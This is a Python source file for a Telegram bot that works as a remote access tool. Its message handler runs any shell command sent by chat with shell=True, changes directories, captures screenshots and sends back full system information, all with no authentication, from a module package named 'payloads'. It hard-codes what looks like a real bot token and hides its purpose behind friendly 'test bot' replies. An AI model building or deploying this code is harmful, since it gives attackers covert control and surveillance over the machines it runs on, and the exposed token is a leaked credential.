import subprocess
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Optional screenshot support for Linux & Windows
from payloads.scrcap import capture_screen  # Must implement for your OS
from payloads.info import get_all_system_info
BOT_TOKEN = "7843150896:AAHpay0sUjwT2rclZ77PeO4yVRZLtbnb9nE"

# Global current working dir
cwd = os.getcwd()




# Function to split message into chunks and send them
async def send_large_message(update, message):
    max_message_length = 4096  # Max length for a Telegram message
    # Split the message into chunks if it's too long
    for i in range(0, len(message), max_message_length):
        chunk = message[i:i + max_message_length]
        await update.message.reply_text(chunk)
















# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hello! I'm your bot. Type /help to see what I can do.")

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Welcome message\n"
        "/help - Show this help\n"
        "cmd <command> - Run system command\n"
        "scrcap - Capture screen\n"
        "info - get system info\n"
    )

# Text message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cwd
    msg = update.message.text.strip()

    if msg.lower() == "hi":
        await update.message.reply_text("Hello there, friend!")
    elif msg.lower() == "bye":
        await update.message.reply_text("Goodbye or see ya 👋")
    elif msg.lower() == "use":
        await update.message.reply_text("I'm just a test bot 🤖")
    elif msg.lower() == "info":
        data_get_all_system_info = get_all_system_info()
        await send_large_message(update, data_get_all_system_info)
    elif msg.lower() == "scrcap":
        try:
            path, name = capture_screen()
            await update.message.reply_text("Here is screen capture for you 👇")
            with open(path, "rb") as f:
                await update.message.reply_photo(f)
        except Exception as e:
            await update.message.reply_text(f"[!] Screenshot failed: {e}")
    elif msg.lower().startswith("cmd "):
        cmd = msg[4:].strip()
        if cmd.lower().startswith("cd "):
            path = cmd[3:].strip().strip('"')
            new_path = os.path.abspath(os.path.join(cwd, path))
            if os.path.isdir(new_path):
                cwd = new_path
                await update.message.reply_text(f"Changed directory to: {cwd}")
            else:
                await update.message.reply_text(f"[-] Directory not found: {path}")
        else:
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    cwd=cwd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
                output = result.stdout.strip() or "[+] Done with no output."
                error = result.stderr.strip()
                reply = output + ("\n[!] " + error if error else "")
                await update.message.reply_text(reply[:4096])
            except Exception as e:
                await update.message.reply_text(f"[!] Error: {e}")
    else:
        await update.message.reply_text("I don't understand that. Try /help")

# Main function
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
